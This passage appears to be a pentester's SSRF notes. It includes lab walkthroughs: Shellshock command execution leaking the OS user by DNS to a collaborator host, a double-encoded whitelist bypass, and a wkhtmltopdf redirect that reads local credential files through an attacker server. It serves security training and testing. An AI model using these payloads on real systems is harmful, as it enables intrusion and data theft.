The server fetches the `Referer` header (blind SSRF) and the internal back-end at `192.168.0.X:8080` runs a Bash CGI handler vulnerable to Shellshock.

1. Enable **Collaborator Everywhere** extension and mark the lab as in-scope. Browse product pages — Collaborator receives DNS callbacks via `User-Agent` and `Referer`, confirming SSRF.

2. Craft a Shellshock payload in the `User-Agent` header that exfiltrates the OS user via DNS:

```bash
() { :;}; /bin/nslookup $(whoami).<collaborator-id>.oastify.com
```

3. Use Burp Intruder to sweep `192.168.0.[1-255]:8080` in the `Referer` header while the Shellshock payload rides in `User-Agent`:

```http
Referer: http://192.168.0.§1§:8080/
User-Agent: () { :;}; /bin/nslookup $(whoami).<collaborator-id>.oastify.com
```

4. When Intruder hits the vulnerable internal host, Collaborator receives a DNS lookup where the subdomain contains the OS username — which is the lab answer.

---

### Lab 7 — SSRF with whitelist-based input filter (Expert)

The application enforces `stock.weliketoshop.net` as the only allowed host.

**Bypass — double-encoded `#` fragment injection:**

The filter validates the host component once. By embedding `localhost%2523` (double-encoded `#`) before `@`, the validator decodes `%25` → `%` and reads `localhost%23@stock.weliketoshop.net` — treating `localhost%23` as a credential and `stock.weliketoshop.net` as the host (passes whitelist). The HTTP client then further decodes `%23` → `#`, which makes everything before `#` a fragment/userinfo, effectively targeting localhost.

```
# Progression:
http://localhost/admin          → blocked: not whitelisted
http://admin@stock.weliketoshop.net/   → 500 (accepted format)
http://admin#@stock.weliketoshop.net/  → blocked (# seen as fragment, strips domain)
http://admin%23@stock.weliketoshop.net → blocked (decoded once by filter)
http://admin%2523@stock.weliketoshop.net → 500 (double-encode survives filter)
http://localhost%2523@stock.weliketoshop.net → 200, reveals /admin
http://localhost%2523@stock.weliketoshop.net/admin → reveals delete endpoint
```

Final payload:

```http
stockApi=http://localhost%2523@stock.weliketoshop.net/admin/delete?username=carlos
```


## Isolating a blind SSRF sink beyond the first callback

A single OOB hit only proves something in the request triggered a fetch, not which parameter. Two follow-up replays turn one positive into a precise, defensible primitive:

- **Sibling-parameter replay.** Resend the identical URL in every other parameter of the same request, one at a time, changing nothing else. A callback ONLY from the true sink field, and zero from every sibling field (a connection-name label, a username field), proves the hit is attributable to that one parameter rather than to the request or session as a whole.
- **Scheme-presence replay.** Resend the sink with a bare hostname carrying no scheme, then with an unrecognised scheme (e.g. `htp://`). If the bare hostname produces zero callbacks but the bogus scheme still fires, the sink parses the value as a URI before fetching (scheme-agnostic once it parses) rather than pattern-matching on `http`/`https` literally - useful for predicting which alternate schemes are worth trying next.

Both cost one extra request each and convert "the endpoint reaches out somewhere" into "this exact field, parsed as a URI, is the sink."

## Related

- [[open-redirect]] (a redirect on an allowlisted domain chains past SSRF host filters)
- [[aws-metadata-ssrf]] (the cloud metadata endpoint is the highest-impact SSRF target)
- [[dns-rebinding]] (rebinding defeats resolve-then-fetch SSRF validation)

### The SSRF target may be an already-open port, not a hidden one

A port that answers `403` to every external path is not necessarily empty - it can be a vhost
gated on the SOURCE ADDRESS, e.g. an Apache `.htaccess`:

```
order deny,allow
deny from all
allow from 127.0.0.1 localhost
```

Externally every path (even non-existent ones) returns an identical `403`, which reads like a
blanket deny and invites you to write the port off. Through an SSRF the same port serves a
completely different site. Always replay the "empty" ports you already scanned through the SSRF
before hunting for a hidden internal service.

Diagnostic - the differential tells you WHICH kind of gate it is:
- `http://[::1]/` returns the `403` but a case-variant `http://LocalHost/` returns content ->
  the gate is source-IP and the allow list is IPv4-only (`::1` is not in it).
- Every loopback spelling returns the same `403` -> genuinely deny-all; stop.
- A bare integer/octal host (`http://0:80/`, `http://0177.0.0.1/`) can draw a `400 Bad Request`
  from the server rejecting the `Host` header, which is NOT the same as being denied - retry with
  a name-form host before concluding anything.

A blind SSRF port sweep cannot distinguish these: a closed port and an open non-HTTP port both
surface as an empty body once the client raises and the app swallows the exception, and response
time does not separate them either. Enumerate the reachable HTTP roots instead.

<!-- promoted-slug: ssrf-loopback-only-vhost -->

<!-- promoted-slug: for-a-blind-oob-confirmed-ssrf-two-cheap-differential-replay -->

## wkhtmltopdf / HTML-to-PDF: http->file:// redirect = arbitrary local file READ (LFI, not just SSRF)

Server-side HTML-to-PDF renderers (wkhtmltopdf/QtWebKit and similar) that reflect a raw-HTML field
give SSRF via `<iframe src="http://internal">`. A **direct** `<iframe src="file:///etc/passwd">` is
blocked — BUT the renderer FOLLOWS an http->file:// **redirect**, so escalate SSRF to arbitrary LOCAL
FILE READ as the render user:
```
# attacker HTTP server: GET /?u=<url>  ->  302 Location: <url>
<iframe width=1400 height=1800 src="http://ATTACKER/?u=file:///var/www/html/wp-config.php"></iframe>
```
The file renders INTO the PDF; download it and extract text with `mutool draw -F text out.pdf` (or
`pdftotext`). Gotchas: `/proc/*` size-0 files render blank (QtWebKit reads by stat size); a JS
`XMLHttpRequest` to `file://` is cross-origin-blocked from the http-origin page, so the redirect-iframe
is the reliable primitive. Reads any file readable by the renderer's user (usually www-data) — e.g.
`wp-config.php` DB creds, apache vhost confs, `/etc/passwd`.

<!-- promoted-slug: wkhtmltopdf-redirect-to-file-lfi -->
